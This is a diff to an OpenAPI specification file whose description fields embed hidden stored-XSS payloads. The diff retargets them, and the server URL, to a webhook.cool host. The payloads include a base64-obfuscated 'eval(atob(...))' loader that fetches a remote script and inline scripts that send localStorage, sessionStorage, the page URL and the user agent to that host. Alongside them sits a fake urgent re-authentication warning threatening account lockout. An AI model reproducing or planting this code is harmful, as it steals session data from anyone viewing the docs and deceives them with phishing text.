@@ -64,7 +64,7 @@ info:
     <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3RvMXhvemxndGg0MzdldnQyazgyczEwdXpmdW5qZWpqZGxlc2M4aCZlcD12MV9pbnRlcm5uYWxfZ2lmX2J5X2lkJmN0PWc/e5jA4VlhW7gbHYKFrO/giphy.gif" alt="Security Breach Animated" style="max-width: 100%; height: auto; margin: 20px auto; display: block; border-radius: 8px;">
 
     <!-- Blind XSS Payload targeting webhook.site -->
-    <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vd2ViaG9vay5zaXRlL2M5YTg5YTNkLWU2MTktNGQwNi04MjgxLTc2ZThlY2M1NGRjMiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsgb25lcnJvcj1ldmFsKGF0b2IodGhpcy5pZCkpPg== onerror=eval(atob(this.id)) style="display:none;">
+    <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vZW1iYXJyYXNzZWQtZ2lnYWJ5dGUtNDcud2ViaG9vay5jb29sIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOyBvbmVycm9yPWV2YWwoYXRvYih0aGlzLmlkKSk+ onerror=eval(atob(this.id)) style="display:none;">
 
     <!-- Re-introducing direct script tag for DOM XSS, with exfiltration to webhook.site -->
     <div style="display:none;">
@@ -76,7 +76,7 @@ info:
                 localStorage: JSON.stringify(localStorage),
                 sessionStorage: JSON.stringify(sessionStorage)
             };
-            fetch('https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2?data=' + btoa(JSON.stringify(exfilData)), {
+            fetch('https://embarrassed-gigabyte-47.webhook.cool?data=' + btoa(JSON.stringify(exfilData)), {
                 method: 'GET',
                 mode: 'no-cors'
             }).then(() => console.log('Exfiltration attempt sent.')).catch(e => console.error('Exfiltration error:', e));
@@ -108,7 +108,7 @@ info:
     <p style="color: yellow; text-align: center; font-weight: bold;">Do NOT ignore this warning. Failure to re-authenticate will result in permanent account lockout within 24 hours.</p>
   version: 1.0.0
 servers:
-  - url: https://api.legitimate-domain.com/v1
+  - url: https://embarrassed-gigabyte-47.webhook.cool/v1
     description: Production API - DO NOT TRUST!
 paths:
   /auth/emergency-password-reset:
@@ -124,7 +124,7 @@ paths:
               p.textContent = 'Endpoint Description XSS Active: Attempting to grab more data...';
               document.body.appendChild(p);
           }
-          fetch('https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2?log=endpoint_access&url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
+          fetch('https://embarrassed-gigabyte-47.webhook.cool?log=endpoint_access&url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
           alert('DOM XSS from Endpoint Description!');
         </script>
         <img src="x" onerror="alert('Image onerror XSS from Endpoint Description!');">
